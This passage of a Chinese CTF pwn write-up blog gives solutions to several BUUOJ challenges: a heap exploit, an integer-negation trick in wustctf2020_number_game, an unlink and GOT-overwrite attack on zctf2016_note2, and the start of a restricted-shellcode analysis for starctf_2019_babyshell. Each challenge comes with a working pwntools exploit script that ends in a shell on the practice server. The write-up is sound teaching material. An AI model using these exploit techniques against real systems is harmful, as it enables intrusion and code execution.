class=\"token punctuation\">,</span><span class=\"token number\">28272</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> size1<span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># one time two malloc</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"> ba's length : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> ba : '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"> na's length : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> na : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> Banana ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> SCP project ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x6020A8</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119002707269.png\" alt=\"image-20231119002707269\"></p>\n<h1 id=\"wustctf2020_number_game\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_number_game\">#</a> *wustctf2020_number_game</h1>\n<p>** 考点：**int 数据</p>\n<p>看代码，若输入的数字小于 0 且取负后仍小于 0，那么可以 getshell。</p>\n<p><img data-src=\"./image-20231119005428913.png\" alt=\"image-20231119005428913\"></p>\n<p>int 范围中负数范围比正数多 1。对于 32 位程序而言这个多出来的数据为 <code>-2147483648</code> 。</p>\n<p>这个数二进制最高位为 1，其他位为 0。取负是先取反后加一，这个数取反后最高位为 0 其他为 1。若加一，每一位都会进位，最后值依旧是最高位为 1，其他位为 0，即为本身。</p>\n<p><img data-src=\"./image-20231119005440746.png\" alt=\"image-20231119005440746\"></p>\n<p>输入该数，直接 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_number_game')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26335</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2147483648</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119004753899.png\" alt=\"image-20231119004753899\"></p>\n<h1 id=\"zctf2016_note2\"><a class=\"markdownIt-Anchor\" href=\"#zctf2016_note2\">#</a> zctf2016_note2</h1>\n<p>** 考点：**unlink, integer overflow, overlap</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>保护未开启 pie。分配块最多分配 0x80 大小，也就是实际大小最大 0x90。输入函数存在漏洞，当 size 为 0 时 size-1 会变成很大的数。由此解除输入字符限制。</p>\n<p>但是当 <code>malloc(0)</code>  时会分配最小 chunk，也就是真实大小为 0x20。这个块不足以构造 unlink。而被 free 的块的大小需大于 fastbin 的最大大小，因此需 <code>malloc(0x80)</code> 。</p>\n<p>所以最后即为在两个较大块中间夹杂一个 0x20 的小块。在低地址大块中伪造 fakechunk。利用小块修改高地址大块的 size，最后 free 大块。</p>\n<p>在实现任意地址读写后，读取并修改 free 的 got 表然后就基本套路了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'note2'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26675</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x40101C'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'option--->>\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># fastbin</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'(less than 128)\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note content:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'2.append]\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'TheNewContents:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input the id of the note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content is '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x602120</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>c1i <span class=\"token operator\">=</span> ptr <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token number\">0x6020E0</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'address:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#3 -> 1</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] free:'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>free_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libcbase <span class=\"token operator\">=</span> free_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"starctf_2019_babyshell\"><a class=\"markdownIt-Anchor\" href=\"#starctf_2019_babyshell\">#</a> starctf_2019_babyshell</h1>\n<p>** 考点：**shellcode 有限制</p>\n<p>**libc 版本：**libc6_2.23</p>\n<h2 id=\"顺从检测\"><a class=\"markdownIt-Anchor\" href=\"#顺从检测\">#</a> 顺从检测</h2>\n<p>输入的字符只能为以下字符之一： <code>&quot;ZZJ loves shell_code,and here is a gift:\\x0F\\x05 enjoy it!\\n&quot;</code> 。</p>\n<p>对应的有用的汇编代码：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">ASCII</th>\n<th style=\"text-align:center\">Hex</th>\n<th style=\"text-align:center\">Assembler Instruction</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">‘ ’</td>\n<td style=\"text-align:center\">0x20</td>\n<td style=\"text-align:center\">and byte ptr [eax+xx], xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">,</td>\n<td style=\"text-align:center\">0x2c</td>\n<td style=\"text-align:center\">sub al, xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:</td>\n<td style=\"text-align:center\">0x3a</td>\n<td style=\"text-align:center\">cmp xx, [eax+xx]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">!</td>\n<td style=\"text-align:center\">0x21</td>\n<td style=\"text-align:center\">and dword ptr [eax+xx], xx</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\n</td>\n<td style=\"text-align:center\">0x0a</td>\n<td style=\"text-align:center\">or xx, byte ptr [eax+xx]</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">_</td>\n<td style=\"text-align:center\">0x5f</td>\n<td style=\"text-align:center\">pop edi</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Z</td>\n<td style=\"text-align:center\">0x5a</td>\n<td style=\"text-align:center\">pop %rdx</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">c</td>\n<td style=\"text-align:center\">0x63</td>\n<td 